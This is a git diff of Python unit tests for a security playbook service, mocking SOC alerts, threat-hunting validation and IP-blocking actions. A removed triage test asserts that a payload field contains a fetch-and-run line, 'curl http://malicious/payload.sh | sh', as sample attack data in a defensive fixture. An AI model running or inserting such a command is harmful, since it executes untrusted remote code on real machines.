@@ -141,6 +141,37 @@ class PlaybookRequester:
                         ],
                     },
                 }
+            if "10.10.0.2" in dst_ips:
+                return {
+                    "code": "Success",
+                    "data": {
+                        "total": 2,
+                        "item": [
+                            {
+                                "uuId": "alert-inbound-001",
+                                "name": "外部扫描核心资产",
+                                "severity": 72,
+                                "alertDealStatus": 1,
+                                "lastTime": 1739999750,
+                                "direction": 2,
+                                "srcIp": ["8.8.8.8"],
+                                "dstIp": ["10.10.0.2"],
+                                "dstPort": [443],
+                            },
+                            {
+                                "uuId": "alert-inbound-002",
+                                "name": "疑似漏洞利用",
+                                "severity": 80,
+                                "alertDealStatus": 1,
+                                "lastTime": 1739999720,
+                                "direction": 2,
+                                "srcIp": ["1.1.1.1"],
+                                "dstIp": ["10.10.0.2"],
+                                "dstPort": [8443],
+                            },
+                        ],
+                    },
+                }
             if "10.10.0.2" in src_ips:
                 return {
                     "code": "Success",
@@ -371,12 +402,12 @@ class PlaybookServiceTest(unittest.TestCase):
             time.sleep(0.05)
         self.fail(f"playbook run timeout, run_id={run_id}")
 
-    def test_alert_triage_and_threat_hunting_input_validation(self):
+    def test_threat_hunting_and_asset_guard_input_validation(self):
         with Session(engine) as session:
             with self.assertRaises(ValueError):
                 playbook_service.start_run(
                     session,
-                    template_id="alert_triage",
+                    template_id="threat_hunting",
                     params={},
                     session_id="s-validation-1",
                 )
@@ -384,102 +415,37 @@ class PlaybookServiceTest(unittest.TestCase):
                 playbook_service.start_run(
                     session,
                     template_id="threat_hunting",
-                    params={},
-                    session_id="s-validation-2",
-                )
-            with self.assertRaises(ValueError):
-                playbook_service.start_run(
-                    session,
-                    template_id="threat_hunting",
                     params={"ip": "not-an-ip"},
-                    session_id="s-validation-2b",
+                    session_id="s-validation-1b",
                 )
             with self.assertRaises(ValueError):
                 playbook_service.start_run(
                     session,
                     template_id="threat_hunting",
                     params={"ip": "9.9.9.9", "startTimestamp": 200, "endTimestamp": 100},
-                    session_id="s-validation-2c",
+                    session_id="s-validation-1c",
                 )
             with self.assertRaises(ValueError):
                 playbook_service.start_run(
                     session,
                     template_id="asset_guard",
                     params={},
-                    session_id="s-validation-3",
+                    session_id="s-validation-2",
                 )
             with self.assertRaises(ValueError):
                 playbook_service.start_run(
                     session,
                     template_id="asset_guard",
                     params={"asset_ip": "bad-ip"},
-                    session_id="s-validation-4",
+                    session_id="s-validation-3",
                 )
             with self.assertRaises(ValueError):
                 playbook_service.start_run(
                     session,
                     template_id="asset_guard",
                     params={"asset_ip": "2001:db8::1"},
-                    session_id="s-validation-4b",
+                    session_id="s-validation-3b",
                 )
-            with self.assertRaises(ValueError):
-                playbook_service.start_run(
-                    session,
-                    template_id="alert_triage",
-                    params={"incident_uuid": "invalid-uuid"},
-                    session_id="s-validation-5",
-                )
-            with self.assertRaises(ValueError):
-                playbook_service.start_run(
-                    session,
-                    template_id="alert_triage",
-                    params={"mode": "block_ip", "ip": "bad-ip"},
-                    session_id="s-validation-6",
-                )
-
-    def test_alert_triage_count_payloads(self):
-        fake_requester = PlaybookRequester()
-        with (
-            patch("app.playbook.service.get_requester_from_credential", return_value=fake_requester),
-            patch("app.playbook.service.LLMRouter.complete", return_value="triage summary"),
-        ):
-            with Session(engine) as session:
-                run = playbook_service.start_run(
-                    session,
-                    template_id="alert_triage",
-                    params={"incident_uuid": "incident-real-001"},
-                    session_id="s-triage-1",
-                )
-                final_run = self._wait_run_finished(session, run.id)
-                self.assertEqual(final_run.status, "Finished")
-                payload = playbook_service.serialize_run(final_run)
-                result = payload.get("result", {})
-                cards = result.get("cards", [])
-                impact_card = next((card for card in cards if card.get("data", {}).get("namespace") == "triage_impact"), {})
-                rows = impact_card.get("data", {}).get("rows", [])
-                self.assertTrue(rows)
-                self.assertIn("src_total", rows[0])
-                self.assertIn("dst_total", rows[0])
-                triage_view = result.get("triage_view", {})
-                self.assertEqual(triage_view.get("header", {}).get("incident_name"), "异常横向移动告警")
-                self.assertEqual(triage_view.get("attacker", {}).get("ip"), "8.8.8.8")
-                self.assertEqual(triage_view.get("victim", {}).get("host_name"), "PRD-DB-USER-01")
-                self.assertEqual(triage_view.get("victim", {}).get("asset_role"), "核心用户数据库")
-                self.assertEqual(triage_view.get("victim", {}).get("asset_value"), "极高 (核心资产)")
-                self.assertIn("CVE-2020-14882", triage_view.get("victim", {}).get("vulnerability", ""))
-                self.assertTrue(triage_view.get("risk", {}).get("lateral_movement"))
-                self.assertEqual(triage_view.get("risk", {}).get("authenticity"), "极高")
-                self.assertTrue(triage_view.get("tactics", {}).get("mitre"))
-                self.assertIn("curl http://malicious/payload.sh | sh", triage_view.get("payload", {}).get("raw_text", ""))
-                self.assertIn("攻击真实性概率", result.get("summary", ""))
-
-        payloads = fake_requester.count_payloads
-        self.assertTrue(any(p.get("srcIps") == ["8.8.8.8"] for p in payloads))
-        self.assertTrue(any(p.get("dstIps") == ["8.8.8.8"] for p in payloads))
-        self.assertTrue(any(p.get("srcIps") == ["8.8.8.8"] and p.get("severities") == [3, 4] for p in payloads))
-        self.assertTrue(any(p.get("dstIps") == ["8.8.8.8"] and p.get("severities") == [3, 4] for p in payloads))
-        self.assertTrue(any(p.get("srcIps") == ["8.8.8.8"] and p.get("attackStates") == [2, 3] for p in payloads))
-        self.assertTrue(any(p.get("dstIps") == ["8.8.8.8"] and p.get("attackStates") == [2, 3] for p in payloads))
 
     def test_threat_hunting_scan_limit(self):
         fake_requester = EndlessIncidentsRequester()
@@ -502,13 +468,6 @@ class PlaybookServiceTest(unittest.TestCase):
         self.assertTrue(normalized.get("src_only_first"))
         self.assertEqual(normalized.get("adaptive_port_topn"), 5)
         self.assertEqual(normalized.get("pivot_ports"), [445, 139, 3389, 22, 5985, 5986, 135])
-
-    def test_alert_triage_block_mode_accepts_batch_ips(self):
-        normalized = playbook_service._normalize_params(
-            "alert_triage",
-            {"mode": "block_ip", "ips": "1.1.1.1, 2.2.2.2,1.1.1.1"},
-        )
-        self.assertEqual(normalized.get("ips"), ["1.1.1.1", "2.2.2.2"])
 
     def test_routine_check_returns_cards_and_next_actions(self):
         fake_requester = PlaybookRequester()
@@ -587,29 +546,24 @@ class PlaybookServiceTest(unittest.TestCase):
                 self.assertEqual(len(trend.get("labels", [])), 7)
                 self.assertEqual(len(trend.get("inbound", [])), 7)
                 self.assertEqual(len(trend.get("outbound", [])), 7)
+                self.assertEqual(sum(trend.get("inbound", [])), 2)
+                self.assertEqual(sum(trend.get("outbound", [])), 4)
+                self.assertEqual(trend.get("inbound", [])[-1], 2)
+                self.assertEqual(trend.get("outbound", [])[-1], 4)
+                self.assertEqual(trend.get("title"), "流量威胁双向评估（最近7个24小时窗口）")
                 next_actions = result.get("next_actions", [])
                 self.assertTrue(next_actions)
-                self.assertTrue(all(action.get("template_id") == "alert_triage" for action in next_actions))
-                self.assertTrue(all("封禁" in (action.get("label") or "") for action in next_actions))
+                self.assertTrue(all(action.get("action_type") == "block_ips" for action in next_actions))
+                self.assertEqual(next_actions[0].get("params", {}).get("block_type"), "SRC_IP")
+                self.assertEqual(next_actions[0].get("params", {}).get("ips"), ["8.8.8.8", "1.1.1.1"])
 
-    def test_action_labels_include_concrete_ip(self):
+    def test_threat_hunting_action_labels_include_concrete_ip(self):
         fake_requester = PlaybookRequester()
         with (
             patch("app.playbook.service.get_requester_from_credential", return_value=fake_requester),
             patch("app.playbook.service.LLMRouter.complete", return_value="summary"),
         ):
             with Session(engine) as session:
-                triage_run = playbook_service.start_run(
-                    session,
-                    template_id="alert_triage",
-                    params={"incident_uuid": "incident-real-001"},
-                    session_id="s-triage-action-label",
-                )
-                triage_final = self._wait_run_finished(session, triage_run.id)
-                triage_result = playbook_service.serialize_run(triage_final).get("result", {})
-                triage_labels = [action.get("label") or "" for action in triage_result.get("next_actions", [])]
-                self.assertTrue(any("8.8.8.8" in label for label in triage_labels))
-
                 hunting_run = playbook_service.start_run(
                     session,
                     template_id="threat_hunting",
@@ -675,15 +629,6 @@ class PlaybookServiceTest(unittest.TestCase):
                 routine_final = self._wait_run_finished(session, routine_run.id)
                 self.assertEqual(routine_final.status, "Finished")
 
-                triage_run = playbook_service.start_run(
-                    session,
-                    template_id="alert_triage",
-                    params={"incident_uuid": "incident-real-001"},
-                    session_id="s-proof-dict-triage",
-                )
-                triage_final = self._wait_run_finished(session, triage_run.id)
-                self.assertEqual(triage_final.status, "Finished")
-
                 hunting_run = playbook_service.start_run(
                     session,
                     template_id="threat_hunting",
@@ -692,23 +637,6 @@ class PlaybookServiceTest(unittest.TestCase):
                 )
                 hunting_final = self._wait_run_finished(session, hunting_run.id)
                 self.assertEqual(hunting_final.status, "Finished")
-
-    def test_triage_assessment_keeps_low_risk_consistent(self):
-        assessment = playbook_service._build_triage_assessment(
-            confidence_num=12,
-            impact_high=0,
-            impact_success=0,
-            attack_success_count=0,
-            boundary_breached=False,
-            lateral_observed=False,
-            risk_tags=[],
-            mitre_ids=[],
-            payload_lines=[],
-            ai_results=["AI分析无异常"],
-        )
-        self.assertEqual(assessment.get("authenticity"), "较低")
-        self.assertEqual(assessment.get("recommendation"), "归档告警，无需进一步处置")
-        self.assertIn("无MITRE攻击技术匹配", assessment.get("key_evidence", ""))
 
     def test_preview_block_targets_should_expose_linkable_af_devices(self):
         fake_requester = PlaybookRequester(
